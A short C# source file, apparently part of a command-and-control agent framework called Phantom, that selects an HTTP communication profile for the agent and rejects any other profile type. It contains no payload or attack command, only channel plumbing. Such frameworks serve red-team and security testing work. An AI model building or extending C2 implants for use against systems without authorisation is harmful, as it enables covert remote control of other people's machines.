using PhantomInterop.Interfaces;
using HttpTransport;
using System;
using System.Collections.Generic;

namespace Phantom.Management.C2
{
    public class CommHandler : PhantomInterop.Classes.CommHandler
    {
        public CommHandler(IAgent agent) : base(agent)
        {

        }

        public override IC2Profile NewC2Profile(Type c2, ISerializer serializer, Dictionary<string, string> parameters)
        {
            if (c2 == typeof(HttpProfile))
            {
                return new HttpProfile(parameters, serializer, Agent);
            } else
            {
                throw new ArgumentException($"Unsupported C2 Profile type: {c2.Name}");
            }
        }
    }
}
